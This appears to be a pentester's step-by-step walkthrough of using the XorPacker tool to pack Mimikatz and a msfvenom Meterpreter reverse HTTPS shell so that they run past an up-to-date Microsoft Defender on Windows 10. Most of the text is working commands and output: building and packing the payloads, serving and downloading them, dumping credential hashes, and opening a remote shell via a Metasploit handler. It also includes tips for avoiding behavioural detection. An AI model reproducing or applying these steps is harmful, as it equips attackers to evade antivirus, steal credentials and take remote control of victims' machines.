=========================================================================================================================================================
AV bypass using the packer 'XorPacker'
=========================================================================================================================================================

=> Source: https://github.com/tmenochet/XorPacker

It is a packer software that uses XOR encryption. The resulting packed PE uses a bruteforce attack to decrypt the payload and evade AV sandbox checks.

XorPacker can be used to pack:
=> PE
=> .NET assembly
=> Shellcode


=========================================================================================================================================================
PoC 1 - Example with Mimikatz.exe (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
=========================================================================================================================================================

------------------------------------------------------------------------------
Step 1 - Build the tool 'XorPacker' (https://github.com/tmenochet/XorPacker)
------------------------------------------------------------------------------

jeff@kali:~$ cd Documents/Tools/XorPacker-master/
jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al
total 68
drwxr-xr-x  3 jeff jeff  4096 Oct 19  2020 .
drwxr-xr-x 32 jeff jeff  4096 Dec 21 01:19 ..
-rw-r--r--  1 jeff jeff    97 Oct 19  2020 .gitmodules
-rw-r--r--  1 jeff jeff 35148 Oct 19  2020 LICENSE
drwxr-xr-x  2 jeff jeff  4096 Oct 19  2020 MemoryModule
-rwxr-xr-x  1 jeff jeff  1910 Oct 19  2020 README.md
-rwxr-xr-x  1 jeff jeff  1615 Oct 19  2020 stub_shellcode_go.py
-rwxr-xr-x  1 jeff jeff  1934 Oct 19  2020 stub_unmanaged_go.py
-rwxr-xr-x  1 jeff jeff  2720 Oct 19  2020 xorpacker.py

jeff@kali:~/Documents/Tools/XorPacker-master$ sudo apt install cmake
[sudo] password for jeff: 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
<SNIP>

jeff@kali:~/Documents/Tools/XorPacker-master$ sudo apt install g++-mingw-w64-x86-64 gcc-mingw-w64-x86-64 g++-mingw-w64-i686 gcc-mingw-w64-i686
Reading package lists... Done
Building dependency tree       
<SNIP>

jeff@kali:~/Documents/Tools/XorPacker-master$ cd ./MemoryModule
jeff@kali:~/Documents/Tools/XorPacker-master/MemoryModule$ mkdir build; cd build
jeff@kali:~/Documents/Tools/XorPacker-master/MemoryModule/build$ cmake ..
-- The C compiler identification is GNU 12.2.0
-- The CXX compiler identification is GNU 12.2.0
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
<SNIP>

jeff@kali:~/Documents/Tools/XorPacker-master/MemoryModule/build$ make MemoryModule
[ 50%] Building C object CMakeFiles/MemoryModule.dir/MemoryModule.c.o
[100%] Linking C static library MemoryModule.a
[100%] Built target MemoryModule


jeff@kali:~/Documents/Tools/xorpacker$ sudo apt install golang-1.19-go
Reading package lists... Done
Building dependency tree       
Reading state information... Done
<SNIP>

jeff@kali:~/Documents/Tools$ sudo apt install golang-go
Reading package lists... Done
Building dependency tree       
Reading state information... Done
<SNIP>


--------------------------------------------------------------------------------------------------------------
Step 2 - Generate an encrypted packed version of the tool Mimikatz.exe (x64) using 'XorPacker'
--------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/XorPacker-master/$ curl -v http://192.168.1.113:8081/mimikatz.exe -O
*   Trying 192.168.1.113:8081...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 192.168.1.113 (192.168.1.113) port 8081 (#0)
<SNIP>


jeff@kali:~/Documents/Tools/XorPacker-master$ python3 ./xorpacker.py -f mimikatz.exe -t UNMANAGED 

[>] Payload file: mimikatz.exe
[>] Payload type: UNMANAGED

[*] Encrypting payload...
[*] Compressing payload...
[*] Encoding payload...
[*] Generating source file...

[>] You should now build payload.go


jeff@kali:~/Documents/Tools/XorPacker-master$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build payload.go                                                    
                                                                                                                                                                                        
jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al                                                                                                                                                                                      
total 6388                                                                                                                                                                                                                                 
drwxr-xr-x  4 jeff jeff    4096 Dec 21 01:52 .                                                                                                                                                                                             
drwxr-xr-x 32 jeff jeff    4096 Dec 21 01:19 ..                                                                                                                                                                                            
-rw-r--r--  1 jeff jeff      97 Oct 19  2020 .gitmodules                                                                                                                                                                                   
-rw-r--r--  1 jeff jeff   35148 Oct 19  2020 LICENSE                                                                                                                                                                                       
drwxr-xr-x  7 jeff jeff    4096 Dec 21 01:40 MemoryModule                                                                                                                                                                                  
-rw-r--r--  1 jeff jeff 1355680 Dec 21 01:39 mimikatz.exe                                                                                                                                                                                  
-rw-r--r--  1 jeff jeff   11805 Dec 21 01:49 Notes.txt
-rwxr-xr-x  1 jeff jeff 4102456 Dec 21 01:52 payload.exe
-rw-r--r--  1 jeff jeff  994622 Dec 21 01:44 payload.go
drwxr-xr-x  2 jeff jeff    4096 Dec 21 01:42 __pycache__
-rwxr-xr-x  1 jeff jeff    1910 Oct 19  2020 README.md
-rwxr-xr-x  1 jeff jeff    1615 Oct 19  2020 stub_shellcode_go.py
-rwxr-xr-x  1 jeff jeff    1934 Oct 19  2020 stub_unmanaged_go.py
-rwxr-xr-x  1 jeff jeff    2720 Oct 19  2020 xorpacker.py


---------------------------------------------------------------------------------------------------------------------------------------------
Step 3 - Download and execute the packed version of Mimkatz on a Windows 10 laptop without being detected nor blocked by the MS Defender AV
---------------------------------------------------------------------------------------------------------------------------------------------

PS C:\Users\Administrator.PO718687\Downloads> wget -URI http://192.168.1.30:8080/payload.exe -OutFile payload.exe

PS C:\Users\Administrator.PO718687\Downloads> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

RealTimeProtectionEnabled : True
IoavProtectionEnabled     : True
AntispywareEnabled        : True


PS C:\Users\Administrator.PO718687\Downloads> .\payload.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 33201662 (00000000:01fa9dfe)
Session           : Interactive from 2
User Name         : Administrator
Domain            : PO718687
Logon Server      : PO718687
Logon Time        : 20/12/2022 19:52:06
SID               : S-1-5-21-936125016-2310263949-2175806047-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : PO718687
         * NTLM     : 36f7a3ebaa54935ecf03678e<snip>
         * SHA1     : d5feabcececab0e16c2cbb39<snip>
        tspkg :
         * Username : Administrator
         * Domain   : PO718687
         * Password : <snip>
        wdigest :
         * Username : Administrator
         * Domain   : PO718687
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : PO718687
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO
<SNIP>


=========================================================================================================================================================
PoC 2 - Example with a Meterpreter reverse shell HTTPS (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
=========================================================================================================================================================

------------------------------------------------------------------------------------
Step 1 - Generate a Meterpreter reverse shell HTTPS (x64) using 'Msfvenom'
------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/XorPacker-master$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.30 LPORT=443 EXITFUNC=thread 
-a x64 -f exe -x ../Windows/pslist64.exe > meterpreter_rev_https_pslist64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 653 bytes
Final size of exe file: 192000 bytes

-------------------------------------------------------------------------------------------------------------
Step 2 - Use 'XorPacker' to generate a packed version of the Meterpreter HTTPS reverse shell (x64)
-------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/XorPacker-master$ ./xorpacker.py -h
usage: xorpacker.py [-h] -f FILE [-t {SHELLCODE,MANAGED,UNMANAGED}] [-a {anyCPU,x64,x86}]

Basic packer using XOR encryption

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  specify the payload file (default: None)
  -t {SHELLCODE,MANAGED,UNMANAGED}, --type {SHELLCODE,MANAGED,UNMANAGED}
                        specify the payload type (default: UNMANAGED)
  -a {anyCPU,x64,x86}, --arch {anyCPU,x64,x86}
                        specify the target architecture (only required for packing MANAGED code) (default: anyCPU)


jeff@kali:~/Documents/Tools/XorPacker-master$ ./xorpacker.py -f meterpreter_rev_https_pslist64.exe -t UNMANAGED -a x64

[>] Payload file: meterpreter_rev_https_pslist64.exe
[>] Payload type: UNMANAGED
[*] Encrypting payload...
[*] Compressing payload...
[*] Encoding payload...
[*] Generating source file...
[>] You should now build payload.go

jeff@kali:~/Documents/Tools/XorPacker-master$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build payload.go 

jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al payload.exe 
-rwxr-xr-x 1 jeff jeff 3365132 Dec 28 10:29 payload.exe

------------------------------------------------------------------------------------------------------------------------------------
Step 3 - Download and execute on a Windows 10 laptop the packed version of the Meterpreter HTTPS reverse shell (x64) without being 
         detected nor blocked by the Microsoft Defender Antivirus 
------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/XorPacker-master$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.1.113 - - [28/Dec/2022 10:08:53] "GET / HTTP/1.1" 200 -
192.168.1.113 - - [28/Dec/2022 10:08:57] "GET /payload.exe HTTP/1.1" 200 -  


PS C:\Users\Administrator\Downloads> wget -URI http://192.168.1.30:8080/payload.exe -OutFile SuperRevShellHttps.exe

PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL                                                                                                                                                              
AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 28/12/2022 00:46:20


PS C:\Users\Administrator\Downloads> .\SuperRevShellHttps.exe
PS C:\Users\Administrator\Downloads>

Important note regarding AV detection  
-------------------------------------
=> In general, with Metasploit if you want to limit the chance of being detected & blocked by antivirus solutions, it is recommanded to avoid using known 
   post-exploitation modules and to use the Meterpreter session mainly as a way to pivot and perform lateral movement (i.e. socks_proxy + proxychains).  
   Indeed, if you use well knwon post-exploitation modules like "hashdump" or even just the "shell" command, antivirus like MS Defender will often detect these 
   actions as 'Behavior:Win32/Meterpreter.gen!D' or 'Behavior:Win32/Meterpreter.A!sms' and will kill the Meterpreter session.


------------------------------------------------------------------------------------------------------------------------------------
Step 4 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop 
------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/Windows$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; 
set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true;  
run -j"
       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_https
LHOST => 192.168.1.30
LPORT => 443
EXITFUNC => thread
ExitOnSession => false
SessionCommunicationTimeout => 0
EnableUnicodeEncoding => true
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://192.168.1.30:443

msf6 exploit(multi/handler) > jobs -l

Jobs
====

  Id  Name                    Payload                                Payload opts
  --  ----                    -------                                ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_https  https://192.168.1.30:443

msf6 exploit(multi/handler) > 
[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: hs8qwak9) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: hs8qwak9) Staging x64 payload (201308 bytes) ...
[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: hs8qwak9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-28 10:31:27 +0100

msf6 exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                        Connection
  --  ----  ----                     -----------                        ----------
  1         meterpreter x64/windows  PO718687\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid 
Server username: PO718687\Administrator

meterpreter > shell
Process 7828 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.2364]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.PO718687\Downloads>exit
exit

meterpreter > 

<SNIP>
